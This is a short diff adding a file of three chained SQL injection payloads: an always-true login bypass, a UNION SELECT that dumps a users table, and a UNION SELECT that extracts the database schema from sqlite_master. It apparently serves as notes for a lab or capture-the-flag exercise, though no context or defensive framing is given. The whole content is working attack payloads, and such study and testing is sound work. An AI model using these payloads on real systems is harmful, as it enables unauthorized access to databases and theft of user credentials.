@@ -1,0 +1,5 @@
+1' or 1=1 -- 
+↓
+ ' UNION SELECT * FROM users --
+↓
+ ' UNION SELECT group_concat(sql), group_concat(sql), group_concat(sql) FROM sqlite_master --
